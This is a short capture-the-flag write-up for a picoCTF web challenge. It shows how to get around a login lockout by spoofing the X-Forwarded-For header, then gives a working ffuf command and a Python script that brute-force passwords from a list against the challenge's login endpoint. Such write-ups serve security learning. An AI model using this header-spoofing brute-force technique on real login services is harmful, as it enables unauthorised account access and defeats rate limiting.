# URL
https://play.picoctf.org/practice/challenge/521
# Concept
* bypassing brute-force restrictions
* using the `X-Forwarded-For` header
# Method of solve
* we're given a password list and a username, but we notice that the app locks your app after two incorrect login attempts
* we need to bypass the rate-limiting, and we can do that with the `X-Forwarded-For` header
* we can use `FFuF` to fuzz the app and perform the brute force attack
* FFuF command
```
ffuf -X POST -d '{"email":"ctf-player@picoctf.org","password":"FUZZ2"}' -H "Content-Type: application/json" -H "X-Forwarded-For: 127.FUZZ1.1.1" -u http://amiable-citadel.picoctf.net:62495/login -w ./passwords.txt:FUZZ2 -w ./numbers.txt:FUZZ1 -mc all -mode pitchfork
```
## Python Solution
```
import requests

with open("passwords.txt", "r", encoding="utf-8") as f:
    for i, line in enumerate(f, start=1):
        email = "ctf-player@picoctf.org"
        password = line
        payload = {"email": email, "password": password}
        URL = "http://amiable-citadel.picoctf.net:49587/"
        endpoint = "login"
        headers = {"Content-Type": "application/json", "X-Forwarded-For": f"10.10.10.{i}"}
        r = requests.post(url=URL+endpoint, json=payload, headers=headers)
        response = r.text
        print(f"Trying password: {line}")
        print(f"Server Response: {response}")
        if "true" in response:
            print(f"Password found: {line}!")
            break
```

